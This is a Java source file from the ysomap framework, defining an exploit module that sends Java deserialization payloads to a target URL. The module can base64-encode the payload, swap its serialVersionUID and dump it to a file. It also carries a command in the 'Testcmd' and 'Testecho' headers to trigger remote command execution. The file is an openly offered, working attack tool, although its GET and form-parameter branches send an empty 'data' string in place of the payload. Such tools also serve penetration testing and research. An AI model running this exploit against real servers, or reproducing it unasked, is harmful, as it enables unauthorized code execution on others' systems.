package ysomap.exploits;

import okhttp3.*;
import ysomap.common.annotation.*;
import ysomap.common.util.Logger;
import ysomap.common.util.Status;
import ysomap.common.util.Strings;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.ByteHelper;
import ysomap.core.util.HTTPHelper;
import ysomap.payloads.Payload;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;

@Exploits
@Authors({Authors.PADISHAH})
@Require(bullets = {
        "Any Java Serialization Payload"
}, param = true)
@Details("Common Deserialization Exploits.\nPut the serialization payload into http post body.")
public class CommonDeserializeExploit extends AbstractExploit {
    @NotNull
    @Require(name = "target", detail = "Target URL")
    public String target = null;

    @NotNull
    @Require(name = "requestMethod", detail = "GET or POST, default POST")
    public String requestMethod = "POST";

    @NotNull
    @Require(name = "paramName", detail = "The GET/POST parameter to contain serialized data, set empty(default) to put payload in POST body")
    public String paramName = "";

    @NotNull
    @Require(name = "serialVersionUID", detail = "Set the serial version UID of payload, e.g. -3490850999041592962:-2044202215314119608 means replace -3490850999041592962 by -2044202215314119608")
    public String suid = "";

    @NotNull
    @Require(name = "encode", detail = "Select encoder: raw(default), base64")
    public String encode = "raw";

    @NotNull
    @Require(name = "cmd", detail = "Command to run, default: whoami")
    public String cmd = "whoami";

    @NotNull
    @Require(name = "serFile", detail = "The serialization file to include")
    public String serFile = "";

    @NotNull
    @Require(name = "dump", detail = "Dump the serialization data to file")
    public String dump = "";


    @NotNull
    public Payload payload;
    public String payloadName;


    @Override
    public void work() {
        String data = "";
        byte[] dataBytes;
        if (serFile.isEmpty()) {
            try {
                Serializer serializer = SerializerFactory.createSerializer("default");
//                if (!serialVersionUID.isEmpty()) {
//                    payload.setSerialVersionUID(serialVersionUID);
//                }
                Logger.normal(serializer.getSerialVersionUID().toString());
                byte[] bytes = (byte[]) serializer.serialize((Payload) payload);
                if (encode.equals("base64")) {
                    bytes = Strings.base64encode(bytes);
                }
                dataBytes = bytes;
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        } else {
            try {
                byte[] tmp = new byte[1024];
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                InputStream inputStream = Files.newInputStream(Paths.get(serFile));
                Logger.normal("Use serialization data from file: " + serFile);
                int i;
                while ((i = inputStream.read(tmp, 0, tmp.length)) != -1) {
                    byteArrayOutputStream.write(tmp, 0, i);
                }
                byteArrayOutputStream.flush();
                dataBytes = byteArrayOutputStream.toByteArray();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }

        if (!suid.isEmpty()) {
            int i = suid.indexOf(":");
            if (i >= 0) {
                Long oldV = Long.parseLong(suid.substring(0, i));
                Long newV = Long.parseLong(suid.substring(i + 1));
                Logger.normal(String.format("Replacing serialVersionUID from %s to %s", oldV.toString(), newV.toString()));
                if(ByteHelper.replaceSerialVersion(oldV,newV, dataBytes)) {
                    Logger.normal(String.format("Successfully Replace serialVersionUID from %s to %s", oldV.toString(), newV.toString()));
                }else{
                    Logger.normal(String.format("Failed to Replace serialVersionUID from %s to %s: not found source sequence", oldV.toString(), newV.toString()));

                }

            }
        }
        if(!dump.isEmpty()){
            try {
                ByteHelper.writeBytes2File(dataBytes, Paths.get(dump));
                Logger.normal(String.format("Saved to %s", dump));
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        //construct http request
        if (requestMethod.equalsIgnoreCase("get")) {
            if (paramName.isEmpty()) {
                Logger.error("Param 'paramName' can not be empty");
                return;
            }
            HttpUrl.Builder builder = HttpUrl.parse(target).newBuilder();
            builder.addQueryParameter(paramName, data);
            String url = builder.build().toString();
            Response response = HTTPHelper.get(url, null, false);
            Logger.normal(HTTPHelper.parseResponse(response));
        } else if (requestMethod.equalsIgnoreCase("post")) {
            RequestBody body;
            if (paramName.isEmpty()) {
                body = RequestBody.create(MediaType.parse("application/octet-stream"), dataBytes);
//                body = RequestBody.create(MediaType.parse("application/octet-stream"), data);
//                body = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), URLEncoder.encode(data));
            } else {
                body = new FormBody.Builder()
                        .add(paramName, data)
                        .build();
            }
            Headers headers = new Headers.Builder()
                    .add("Testecho", cmd)
                    .add("Testcmd", cmd)
                    .build();
            Response response = HTTPHelper.post(target, body, headers, false);
            Logger.normal(HTTPHelper.parseResponse(response));
        } else {
            Logger.error(String.format("Unsupported http method: %s", requestMethod));
            return;
        }


    }

    @Override
    public void stop() {
        status = Status.STOPPED;
    }

    @Override
    public Payload getPayload() {
        return payload;
    }
}
